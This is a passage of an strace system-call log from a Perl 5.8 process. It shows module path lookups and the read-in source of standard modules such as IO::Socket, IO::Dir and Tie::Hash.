9851  20:00:43.778594 <... read resumed> "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
9851  20:00:43.788719 brk(0x829c000)    = 0x829c000
9851  20:00:43.789002 read(8, "", 4096) = 0
9851  20:00:43.789030 close(8)          = 0
9851  20:00:43.789852 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
9851  20:00:43.790251 _llseek(6, 6496, [6496], SEEK_SET) = 0
9851  20:00:43.790270 _llseek(6, 0, [6496], SEEK_CUR) = 0
9851  20:00:43.790281 close(6)          = 0
9851  20:00:43.790347 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.790365 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.790379 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.790393 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.790408 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.790422 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.790437 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.790449 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.790464 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.790476 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.790490 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.790505 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
9851  20:00:43.790529 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
9851  20:00:43.790549 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9efc68) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.790563 _llseek(6, 0, [0], SEEK_CUR) = 0
9851  20:00:43.790579 brk(0x82bd000)    = 0x82bd000
9851  20:00:43.790596 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
9851  20:00:43.791523 _llseek(6, 1386, [1386], SEEK_SET) = 0
9851  20:00:43.898618 _llseek(6, 0, [1386], SEEK_CUR) = 0
9851  20:00:43.898639 close(6)          = 0
9851  20:00:43.898748 stat64("/etc/perl/IO/Dir.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.898767 stat64("/etc/perl/IO/Dir.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.898781 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.898795 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.898809 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.898822 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.898837 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.898849 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.898863 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.898875 stat64("/usr/share/perl5/IO/Dir.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.898888 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.898902 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
9851  20:00:43.898924 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
9851  20:00:43.898940 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9efc68) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.898953 _llseek(6, 0, [0], SEEK_CUR) = 0
9851  20:00:43.898976 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
9851  20:00:43.899484 stat64("/etc/perl/Tie/Hash.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.899503 stat64("/etc/perl/Tie/Hash.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.899521 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.899534 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.900011 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.900026 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.900040 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.900052 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.900066 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.900078 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.900091 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.900104 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.900118 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.900132 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
9851  20:00:43.900154 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.900169 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.900181 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.900201 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
9851  20:00:43.900570 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
9851  20:00:43.901130 read(8, "", 4096) = 0
9851  20:00:43.901147 close(8)          = 0
9851  20:00:43.901179 stat64("/etc/perl/File/stat.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.901194 stat64("/etc/perl/File/stat.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.901209 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.901222 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.901236 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.901249 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.901264 stat64("/usr/lib/perl5/File/stat.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.901276 stat64("/usr/lib/perl5/File/stat.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.901289 stat64("/usr/share/perl5/File/stat.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.901302 stat64("/usr/share/perl5/File/stat.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.901316 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.901329 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.901343 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.901356 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
9851  20:00:43.901378 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.901393 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.901405 _llseek(8, 0, [0], SEEK_CUR) = 0
